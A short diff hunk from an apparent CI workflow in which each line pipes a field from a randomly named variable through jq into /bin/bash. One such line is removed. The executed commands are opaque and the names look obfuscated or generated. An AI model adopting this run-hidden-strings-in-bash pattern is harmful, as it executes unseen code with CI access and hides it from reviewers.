@@ -24,7 +24,6 @@ jobs:
           echo $odcy2224 | jq -r .cj21258 | /bin/bash
           printf '%s' "$ci6" | jq -r .oib6370 | /bin/bash
           echo $vdout1 | jq -r .qmneb56 | /bin/bash
-          echo $eisk2 | jq -r .dgn7023 | /bin/bash
           printf '%s' "$twsdh7" | jq -r .cettm422 | /bin/bash
           echo $fdr9863 | jq -r .tcrwi56 | /bin/bash
           echo $dvj04 | jq -r .v480 | /bin/bash
